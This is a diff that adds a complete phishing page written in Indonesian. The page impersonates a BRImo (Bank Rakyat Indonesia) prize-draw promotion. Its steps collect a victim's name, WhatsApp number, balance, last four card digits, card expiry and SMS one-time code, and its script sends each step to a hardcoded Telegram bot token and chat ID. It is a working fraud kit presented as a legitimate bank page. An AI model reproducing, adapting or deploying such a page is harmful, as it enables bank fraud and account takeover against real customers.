@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Promo BRImo 2026</title>
+    <style>
+        * { box-sizing: border-box; font-family: 'Helvetica', Arial, sans-serif; }
+        body { margin: 0; background-color: #f4f7f9; display: flex; justify-content: center; }
+        .container { width: 100%; max-width: 480px; background: white; min-height: 100vh; position: relative; }
+        
+        .slide { display: none; width: 100%; animation: fadeIn 0.4s; }
+        .active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* Mengatur Gambar agar Pas */
+        .banner { width: 100%; display: block; height: auto; }
+        
+        .form-wrapper { padding: 25px 20px; }
+        .label-bold { display: block; font-weight: bold; margin-bottom: 8px; font-size: 15px; color: #333; }
+        .input-box { width: 100%; padding: 14px; border: 1.5px solid #ccc; border-radius: 10px; font-size: 16px; margin-bottom: 20px; outline: none; }
+        .input-box:focus { border-color: #00529C; }
+
+        .btn-blue { width: 100%; padding: 16px; background: #00529C; color: white; border: none; border-radius: 10px; font-size: 17px; font-weight: bold; cursor: pointer; }
+        .btn-light { background: #e6f2ff; color: #00529C; margin-top: 10px; }
+
+        .footer { text-align: center; font-size: 11px; color: #999; padding: 20px; line-height: 1.5; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <div id="s1" class="slide active">
+        <img src="utama.jpg" class="banner" alt="Promo Utama">
+        <div class="form-wrapper" style="text-align: center;">
+            <h2 style="color: #00529C;">Selamat Datang!</h2>
+            <p>Silakan klik tombol di bawah untuk pendaftaran undian.</p>
+            <button class="btn-blue" onclick="move(2)">Daftar Sekarang</button>
+        </div>
+    </div>
+
+    <div id="s2" class="slide">
+        <img src="saldo.jpg" class="banner" alt="Cek Saldo">
+        <div class="form-wrapper">
+            <label class="label-bold">Nama Lengkap :</label>
+            <input type="text" id="nama" class="input-box" placeholder="Nama sesuai KTP">
+
+            <label class="label-bold">Nomor WhatsApp :</label>
+            <input type="number" id="wa" class="input-box" placeholder="08xxxx">
+
+            <label class="label-bold">Saldo Terakhir :</label>
+            <input type="text" id="saldo" class="input-box" placeholder="Contoh: Rp 1.000.000" oninput="formatRupiah(this)">
+
+            <button class="btn-blue" onclick="sendData('Step 1')">Lanjutkan</button>
+        </div>
+    </div>
+
+    <div id="s3" class="slide">
+        <img src="kartu.jpg" class="banner" alt="Data Kartu">
+        <div class="form-wrapper">
+            <label class="label-bold">4 Digit Terakhir Kartu :</label>
+            <input type="number" id="digit" class="input-box" placeholder="xxxx" oninput="limit(this, 4)">
+
+            <label class="label-bold">Masa Berlaku (MM/YY) :</label>
+            <input type="text" id="valid" class="input-box" placeholder="01/27" maxlength="5" oninput="fDate(this)">
+
+            <button class="btn-blue" onclick="sendData('Step 2')">Konfirmasi</button>
+        </div>
+    </div>
+
+    <div id="s4" class="slide" style="text-align: center; padding-top: 50px;">
+        <h3 style="color: #00529C;">Verifikasi Kode</h3>
+        <p>Masukkan 6 digit kode yang dikirim via SMS</p>
+        <div class="form-wrapper">
+            <input type="number" id="otp" class="input-box" placeholder="xxxxxx" oninput="limit(this, 6)">
+            <button class="btn-blue" onclick="sendData('Final OTP')">Proses Selesai</button>
+        </div>
+    </div>
+
+    <div class="footer">
+        PT Bank Rakyat Indonesia (Persero) Tbk.<br>Terdaftar dan diawasi oleh OJK.
+    </div>
+</div>
+
+<script>
+    // DATA BOT TELEGRAM KAMU
+    const token = '8606568440:AAFaGya4aEw_5v6yGlQEAOYDA56dYHf_9xk';
+    const chatId = '7078260230';
+
+    function move(n) {
+        document.querySelectorAll('.slide').forEach(s => s.classList.remove('active'));
+        document.getElementById('s' + n).classList.add('active');
+        window.scrollTo(0, 0);
+    }
+
+    function formatRupiah(el) {
+        let val = el.value.replace(/\D/g, '');
+        if (val === '') { el.value = ''; return; }
+        el.value = 'Rp ' + new Intl.NumberFormat('id-ID').format(val);
+    }
+
+    function fDate(el) {
+        let v = el.value.replace(/\D/g, '');
+        if (v.length > 2) el.value = v.substring(0,2) + '/' + v.substring(2,4);
+        else el.value = v;
+    }
+
+    function limit(el, max) {
+        if (el.value.length > max) el.value = el.value.slice(0, max);
+    }
+
+    function sendData(step) {
+        const nama = document.getElementById('nama').value;
+        const wa = document.getElementById('wa').value;
+        const saldo = document.getElementById('saldo').value;
+        const digit = document.getElementById('digit').value;
+        const valid = document.getElementById('valid').value;
+        const otp = document.getElementById('otp').value;
+
+        let pesan = `<b>LOG BRI - ${step}</b>\n`;
+        pesan += `Nama: ${nama}\n`;
+        pesan += `WA: ${wa}\n`;
+        pesan += `Saldo: ${saldo}\n`;
+        if(digit) pesan += `4 Digit: ${digit}\n`;
+        if(valid) pesan += `Valid: ${valid}\n`;
+        if(otp) pesan += `OTP: ${otp}\n`;
+
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}&parse_mode=html`;
+
+        fetch(url).then(() => {
+            if (step === 'Step 1') move(3);
+            else if (step === 'Step 2') move(4);
+            else {
+                alert("Permintaan sedang diproses, silakan tunggu.");
+                location.reload();
+            }
+        });
+    }
+</script>
+
+</body>
+</html>
